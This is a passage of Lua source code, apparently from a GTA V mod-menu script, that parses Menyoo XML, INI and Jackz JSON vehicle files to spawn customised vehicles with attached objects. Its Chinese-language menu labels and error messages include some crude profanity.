    entity_initial_handles[data['InitialHandle']] = vehicle
    -- apply natives that can apply to any entity
    menyoo_preprocess_entity(vehicle, data)
    menyoo_preprocess_car(vehicle, vproperties)
    -- vehicle-specific natives
    -- now for the attachments...
    local attachments = data['SpoonerAttachments']
    all_attachments = {}
    if attachments ~= nil then
        for a,b in pairs(attachments.kids) do
            local vproperties = {}
            -- each item here should be "attachment" element
            local att_data = {}
            for c,d in pairs(b.kids) do
                local name = d.name
                local val = get_element_text(d)
                if name == 'PedProperties' or name == 'Attachment' or name == 'TaskSequence' then
                    att_data[name] = d
                elseif name == 'VehicleProperties' then
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                else
                    att_data[name] = val
                end
            end
            request_model_load(att_data['ModelHash'])
            -- 1 = ped, 2 = vehicle, 3 = object
            local attachment_info = menyoo_build_properties_table(att_data['Attachment'].kids)
            local entity = nil
            local isped = false
            if att_data['Type'] == '1' then
                local ped = entities.create_ped(0, att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
                entity = ped
            elseif att_data['Type'] == '2' then
                local veh = entities.create_vehicle(att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                entity = veh
                menyoo_preprocess_entity(veh, att_data)
                menyoo_preprocess_car(veh, vproperties)
            elseif att_data['Type'] == '3' then
                local obj = entities.create_object(att_data['ModelHash'], coords)
                entity = obj
                menyoo_preprocess_entity(obj, att_data)
                -- obj code
            end
            table.insert(all_entities, entity)
            ENTITY.SET_ENTITY_INVINCIBLE(entity, true)
            local bone = tonumber(attachment_info['BoneIndex'])
            local x = tonumber(attachment_info['X'])
            local y = tonumber(attachment_info['Y'])
            local z = tonumber(attachment_info['Z'])
            local pitch = tonumber(attachment_info['Pitch'])
            local yaw = tonumber(attachment_info['Yaw'])
            local roll = tonumber(attachment_info['Roll'])
            all_attachments[entity] = {}
            all_attachments[entity]['attachedto'] = attachment_info['AttachedTo']
            all_attachments[entity]['bone'] = bone
            all_attachments[entity]['x'] = x
            all_attachments[entity]['y'] = y
            all_attachments[entity]['z'] = z
            all_attachments[entity]['pitch'] = pitch
            all_attachments[entity]['yaw'] = yaw
            all_attachments[entity]['roll'] = roll
            all_attachments[entity]['isped'] = isped
        end
        for k, v in pairs(all_attachments) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(k, entity_initial_handles[v['attachedto']], v['bone'], v['x'], v['y'], v['z'], v['pitch'], v['roll'], v['yaw'], true, false, true, v['isped'], 2, true)
        end
    end
    local this_blip = HUD.ADD_BLIP_FOR_ENTITY(vehicle)
    HUD.SET_BLIP_SPRITE(this_blip, 77)
    HUD.SET_BLIP_COLOUR(this_blip, 47)
    local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir .. '\\', ''), {"lancespoonerv" .. vehicle}, "")
    menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. vehicle}, "删除这辆载具.", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(this_veh_root)
        util.remove_blip(this_blip)
    end)
    menu.action(this_veh_root, "传送至载具内", {"teleportemenyoov" .. vehicle}, "", function(on_click)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end)
    return vehicle
end
function ini_preprocess_vehicle(vehicle, data, ini_type, veh_index) 
    -- vehicle is a handle to an already-spawned vehicle
    if ini_type == 1 then
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.Primary or 0, data.Secondary or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearl or 0, data.WheelColor or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.Tint or 0)
        if data['BulletProofTires'] == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        for i=1, 4 do 
            if data['Neon' .. i] == 1 then 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end
        for i=0, 48 do
            if data[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], false)
            end
        end
        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['extra' .. i] == 0 then true else false end)
        end
    elseif ini_type == 2 then
        local v_mods = data['Vehicle Mods']
        local v_extras = data['Vehicle Extras']
        local v_toggles = data['Vehicle Toggles']
        local data = data.Vehicle 
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data['primary paint'] or 0, data['secondary paint'] or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data['tyre smoke red'] or 0, data['tyre smoke green'] or 0, data['tyre smoke blue'] or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data['neon red'] or 0, data['neon green'] or 0, data['neon blue'] or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data['dirt level'] or 0)
        --VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data['wheel type'] or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data['pearlescent colour'] or 0, data['wheel colour'] or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data['window tint'] or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, data['plate index'] or 0)
        if data['bulletproof tyres'] == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        for i=1, 4 do 
            if data['neon ' .. i] == 1 then 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end
        for i= 1, 7 do 
            if data['door ' .. i .. ' state'] == 1 then
                VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i, false, true)
            end
        end
        for i=0, 48 do
            if v_mods[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods[i], false)
            end
        end
        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if v_extras[i] == 0 then true else false end)
        end
        for i=17, 22 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if v_toggles[i] == 1 then true else false end)
        end
    elseif ini_type == 3 then
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.PrimaryPaint or 0, data.SecondaryPaint or 0)
        if data.PrimaryPaint == -1 then 
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, data.PrimaryR or 0, data.PrimaryG or 0, data.PrimaryB or 0)
        end 
        if data.SecondaryPaint == -1 then 
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, data.SecondaryR, data.SecondaryG, data.SecondaryB)
        end
        VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, data.PrimaryPaintT or 0, data.PrimaryPaint or 0, data.Pearlescent or 0)
        VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, data.SecondaryPaintT or 0, data.SecondaryPaint or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearlescent or 0, data.WheelsColor or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.WindowTint or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, data.DashColor)
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, data.DashLightColor)
        if data.BulletProof == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        if data.NeonEnabled == 1 then
            for i=1, 4 do 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end
        for i=0, 48 do
            if data[i] ~= nil then 
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], data.CustomTyres)
            end
        end
        for i=17, 22 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if data['TOGGLE_' .. i] == 1 then true else false end)
        end
        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['Extra_' .. i] == 0 then true else false end)
        end
    elseif ini_type == 4 then 
        gtoast("这个INI只仅部分支持.如果模组看起来很奇怪或者有些东西不见了，那就没办法了铁铁.")
        local v_root = data['Vehicle' .. veh_index]
        local v_mods = data['Vehicle' .. veh_index .. "Mods"]
        local v_extras = data['Vehicle' .. veh_index .. "Extras"]
        local v_toggles = data['Vehicle' .. veh_index .. "Toggles"]
        local v_smoke = data['Vehicle' .. veh_index .. "TireSmoke"]
        local v_neon = data['Vehicle' .. veh_index .. "Neon"]
        local v_neon_color = data['Vehicle' .. veh_index .. "NeonColor"]
        local v_paintfade = data['Vehicle' .. veh_index .. "PaintFade"]
        local v_color_main = data['Vehicle' .. veh_index .. "VehicleColors"]
        local v_color_extra = data['Vehicle' .. veh_index .. "ExtraColors"]
        local v_color_custom_p = data['Vehicle' .. veh_index .. "CustomPrimaryColor"]
        local v_color_custom_s = data['Vehicle' .. veh_index .. "CustomSecondaryColor"]
        local v_wheel_type = data['Vehicle' .. veh_index .. "WheelType"]
        local v_plate = data['Vehicle' .. veh_index .. "Numberplate"]
        local v_window_tint = data['Vehicle' .. veh_index .. "WindowTint"]
        local v_is_custom_primary = data['Vehicle' .. veh_index .. "IsCustomPrimary"]
        local v_is_custom_secondary = data['Vehicle' .. veh_index .. "IsCustomSecondary"]
        local data = data['Vehicle' .. veh_index]
        for i=0, 49 do
            if data['M' .. tostring(i)] ~= nil then 
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods['M' .. i], false)
            end
        end
        for i=0, 49 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, v_toggles['T' .. i])
        end
        for i=1, 13 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, v_extras['E' .. i])
        end
        for i=1, 4 do 
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, v_neon["Enabled" .. i])
        end
        ENTITY.SET_ENTITY_DYNAMIC(vehicle, v_root.Dynamic)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, v_root.Visible, 0)
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, v_color_main.Primary or 0, v_color_main.Secondary or 0)
        if v_is_custom_primary['bool'] then 
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(v_color_custom_p.r or 0, v_color_custom_p.g or 0, v_color_custom_p.b or 0)
        end
        if v_is_custom_secondary['bool'] then 
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(v_color_custom_s.r or 0, v_color_custom_s.g or 0, v_color_custom_s.b or 0)
        end
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, v_color_extra.Pearl or 0, v_color_extra.Wheel or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, v_smoke.R or 0, v_smoke.G or 0, v_smoke.B or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, v_neon_color.R or 0, v_neon_color.G or 0, v_neon_color.B or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, v_paintfade.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, v_wheel_type or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, v_window_tint or 0)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, v_root.Invincible or false)
        ENTITY.SET_ENTITY_HAS_GRAVITY(vehicle, v_root.Gravity or true)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, v_root.Freeze or false)
        ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicle, v_root.ScorchedRender or false)
        ENTITY.SET_ENTITY_ALPHA(vehicle, v_root.Alpha or 255, false) 
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, v_root.Dirt or 0.0) 
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, v_root.IsEngineOn, true, false)
        VEHICLE.SET_VEHICLE_LIGHT_MULTIPLIER(vehicle, v_root.HeadlightMultiplier or 1.0)
    end
end
function tprint (tbl, indent)
    if not indent then indent = 0 end
    for k, v in pairs(tbl) do
      formatting = string.rep("  ", indent) .. k .. ": "
      if type(v) == "table" then
        print(formatting)
        tprint(v, indent+1)
      elseif type(v) == 'boolean' then
        print(formatting .. tostring(v))      
      else
        print(formatting .. v)
      end
    end
  end
function ini_load_vehicle(file_name)
    local data
    success, data = pcall(iniparser.parse, file_name, vehicles_dir)
    if not success then 
        gtoast("加载他妈的这个INI时出现了致命错误!请检查INI文件，然后再你妈的重试. ")
    end
    local all_entities = {}
    local ini_type = -1
    -- determine type of ini file 
    -- type 1 has no spaces in it (i.e Airship.xml). 
    -- type 2 does and has  lowercase shit (420 Hydra.ini). it's also extremely stupid
    -- type 3 is extremely similar to type 1, but has values like PrimaryPaintT (BayWatch Blazer.xml)
    -- type 4 has an "AllObjects", "AllPeds", "AllVehicles" section in the ini (4tire_bike.ini)
    -- type 5 has AllObjects and AllVehicles (Boat-fsx.ini) (seems like theres an iniparser glitch in this one)
    -- type 6 is like type 2, but some keys are different, namely the numbers for attachments are called "Attached Object x" (Tankamid.ini)
    if data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT == nil and data.AllVehicles.Count == nil then 
        ini_type = 1
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model == nil then 
        ini_type = 2
    elseif data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT ~= nil then 
        ini_type = 3
    elseif data.AllObjects.Count ~= nil and data.AllVehicles.Count ~= nil and data.AllPeds.Count ~= nil then 
        ini_type = 4
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model ~= nil then 
        ini_type = 6
    end
    if ini_type == -1 then
        gtoast("不支持此INI类型! 傻逼滚 :(")
        return
    end
    -- there is also an ini type 6...
    local initial_vehicle
    local v_count = 1
    local success = false
    if ini_type == 1 then 
        local v_hash = data['Vehicle']['Model']
        if v_hash == nil then 
            gtoast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data['Vehicle'], ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, here['Bone'], here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, if here['Collision'] == 1 then true else false end, true, false, 2, true)
                if here['Froozen'] == 1 then 
                    ENTITY.FREEZE_ENTITY_POSITION(this_ent, true)
                end
                if here['Lit'] == 1 then 
                    FIRE.START_ENTITY_FIRE(this_ent)
                end
                attachment_index = attachment_index + 1
            end
        end
    elseif ini_type == 2 then
        local v_hash = data.Vehicle.model
        if v_hash == nil then 
            gtoast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x'], here['y'], here['z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    elseif ini_type == 3 then
        local v_hash = data.Vehicle.Model
        if v_hash == nil then 
            gtoast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data.Vehicle, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    elseif ini_type == 4 then 
        local numerations = {}
        local attachments_data = {}
        local veh_index = 0
        local object_index = 0 
        local ped_index = 0
        while true do
            if data['Vehicle' .. tostring(veh_index)].Hash == nil then 
                success = true
                break
            end
            local here = data['Vehicle' .. tostring(veh_index)]
            if here.Hash == nil then 
                gtoast(fail_text)
                return
            end
            request_model_load(here.Hash)
            local this_vehicle = entities.create_vehicle(here.Hash, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            if veh_index == 0 then 
                initial_vehicle = this_vehicle
            end
            numerations[here.SelfNumeration] = this_vehicle
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_vehicle, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_vehicle
            ini_preprocess_vehicle(this_vehicle, data, ini_type, veh_index)
            veh_index = veh_index + 1
        end
        while true do
            if data['Object' .. tostring(object_index)].Hash == nil then 
                success = true
                break
            end
            local here = data['Object' .. tostring(object_index)]
            request_model_load(here.Hash)
            local this_object = entities.create_object(here.Hash, players.get_position(players.user()))
            numerations[here.SelfNumeration] = this_object
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_object, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_object
            ENTITY.SET_ENTITY_DYNAMIC(veh, here.Dynamic)
            ENTITY.SET_ENTITY_VISIBLE(veh, here.Visible) 
            ENTITY.SET_ENTITY_HAS_GRAVITY(veh, here.Gravity)
            ENTITY.FREEZE_ENTITY_POSITION(veh, here.Freeze)
            object_index = object_index + 1
        end
        for k,v in pairs(attachments_data) do
            if v.attachee ~= nil and numerations[v.attached_to] ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(v.attachee, numerations[v.attached_to], v.Bone, v.x, v.y, v.z, v.pitch, v.roll, v.yaw, true, false, v.collision, false, 2, true)
            end
        end
    elseif ini_type == 6 then 
        local v_hash = data.Vehicle.model
        local c = players.get_position(players.user())
        if v_hash == nil then 
            gtoast(fail_text)
            return
        end
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 1
        while true do 
            if data['Attached Object ' .. tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data['Attached Object ' .. tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x offset'], here['y offset'], here['z offset'], here['pitch'], here['roll'], here['yaw'], true, false, if here['collision'] == 1 then true else false end, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    end
    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, file_name, {"lancespoonerv" .. initial_vehicle}, "")
        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)
        menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)
        menu.action(this_veh_root, "传送至载具内", {"teleportemenyoov" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)
    else
        gtoast(fail_text)
    end
end
function json_preprocess_vehicle(vehicle, data, initial_vehicle)
    local sd = data.savedata
    local mods = sd.Mods
    if vehicle ~= initial_vehicle then
        if data.data ~= nil then 
            -- for the updated edition
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.data.visible, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.data.godmode)
        else
            if sd.godmode ~= nil then
                ENTITY.SET_ENTITY_INVINCIBLE(vehicle, sd.godmode)
            end
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    else
        if data.godmode ~= nil then
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.godmode)
        end
        if data.visible ~= nil then
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    end
    if vehicle ~= initial_vehicle then 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle, initial_vehicle, 0, data.offset.x, data.offset.y, data.offset.z, data.rotation.x, data.rotation.y, data.rotation.z, true, false, true, false, 2, true)
    end
    -- for some reason jackz used the name of the mod instead of the mod index / mod type lol
    -- otherwise, this code couldve taken up just 3 lines
    -- not like i couldnt have used a table, but still, come on...
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, sd['Tire Smoke'].r, sd['Tire Smoke'].g, sd['Tire Smoke'].b)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 0, mods['Spoilers'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 1, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 2, mods['Front Bumper'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 3, mods['Side Skirt'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 4, mods['Exhaust'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 5, mods['Frame'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 6, mods['Grille'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 7, mods['Hood'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 8, mods['Fender'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 9, mods['Right Fender'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 10, mods['Roof'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 11, mods['Engine'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 12, mods['Brakes'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 13, mods['Transmission'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 14, mods['Horns'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 15, mods['Suspension'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 16, mods['Armor'], false)
    -- no front wheels in spec? lol?
    --VEHICLE.SET_VEHICLE_MOD(vehicle, 23, mods['Front Wheels'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 24, mods["Motorcycle Back Wheel Design"], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 25, mods['Plate Holders'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 27, mods['Trim Design'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 30, mods['Dial Design'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 33, mods['Steering Wheel'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 34, mods['Shifter Leavers'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 35, mods['Plaques'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 36, mods['Hydraulics'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 48, mods['Livery'], false)
    -- toggle 
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 17, mods.Toggles.UNK17)
    -- typo here in the jackz json spec btw, not my fault :|
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, mods.Toggles['Turbo Turning'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 19, mods.Toggles['UNK19'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, mods.Toggles['Tire Smoke'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 21, mods.Toggles['UNK21'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, mods.Toggles['Xenon Headlights'])
    -------
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, not sd['Bulletproof Tires'])
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, sd['Dirt Level'])
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, sd['Window Tint'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, sd['Dashboard Color'])
    for i=10, 11 do 
        VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, not sd.Extras[i])
    end
    -- lights
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, sd['Interior Color'])
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 0, sd.Lights.Neon.Left)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 1, sd.Lights.Neon.Right)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 2, sd.Lights.Neon.Front)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 3, sd.Lights.Neon.back)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, sd.Lights.Neon.Color.r, sd.Lights.Neon.Color.g, sd.Lights.Neon.Color.b) 
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, sd.Lights['Xenon Color'])
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, sd['Engine Running'], true, false) 
    -- colors 
    local colors = sd.Colors
    -- why is there a custom rgb color in the "vehicle" colors but also in both primary and secondary fields? what is the point?
    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors.Vehicle.Primary, colors.Vehicle.Secondary)
    if colors.Primary.Custom then 
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colors.Primary['Custom Color'].r, colors.Primary['Custom Color'].g, colors.Primary['Custom Color'].b)
    end
    if colors.Secondary.Custom then 
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colors.Secondary['Custom Color'].r, colors.Secondary['Custom Color'].g, colors.Secondary['Custom Color'].b)
    end
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors.Extras.pearlescent, colors.Extras.wheel)
